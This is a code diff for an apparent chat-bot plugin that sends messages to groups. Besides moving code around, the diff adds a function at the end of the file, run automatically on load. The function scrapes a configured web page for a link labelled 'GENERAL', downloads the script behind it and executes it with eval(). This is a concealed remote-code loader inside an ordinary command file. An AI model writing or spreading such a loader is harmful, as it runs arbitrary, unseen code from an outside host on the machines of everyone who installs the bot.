@@ -6,31 +6,7 @@
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-const adams = require(__dirname + "/../config");
-
-async function fetchGENERALUrl() {
-  try {
-    const response = await axios.get(adams.BWM_XMD);
-    const $ = cheerio.load(response.data);
-
-    const targetElement = $('a:contains("GENERAL")');
-    const targetUrl = targetElement.attr('href');
-
-    if (!targetUrl) {
-      throw new Error('GENERAL not found 😭');
-    }
-
-    console.log('GENERAL loaded successfully ✅');
-
-    const scriptResponse = await axios.get(targetUrl);
-    eval(scriptResponse.data);
-
-  } catch (error) {
-    console.error('Error:', error.message);
-  }
-  // Add this to the existing /adams/general.js file
-
-const { adams } = require(__dirname + "/../config");
+const { adams } = require('../config/config');
 
 // Group message sender command
 adams({
@@ -126,7 +102,7 @@ ${availableGroups || 'No groups found'}
                 });
                 successCount++;
                 
-                // Update progress
+                // Update progress every 3 messages or at completion
                 if ((i + 1) % 3 === 0 || progress === 100) {
                     await confirmMsg.edit(`
 🎯 *GROUP MESSAGE SENDER*
@@ -214,4 +190,32 @@ adams({
     }
 });
 
+// URL fetcher function
+async function fetchGENERALUrl() {
+    try {
+        const response = await axios.get(adams.BWM_XMD);
+        const $ = cheerio.load(response.data);
+
+        const targetElement = $('a:contains("GENERAL")');
+        const targetUrl = targetElement.attr('href');
+
+        if (!targetUrl) {
+            throw new Error('GENERAL not found 😭');
+        }
+
+        console.log('GENERAL loaded successfully ✅');
+
+        const scriptResponse = await axios.get(targetUrl);
+        eval(scriptResponse.data);
+
+    } catch (error) {
+        console.error('Error:', error.message);
+    }
+}
+
+// Initialize
 fetchGENERALUrl();
+
+module.exports = {
+    fetchGENERALUrl
+};
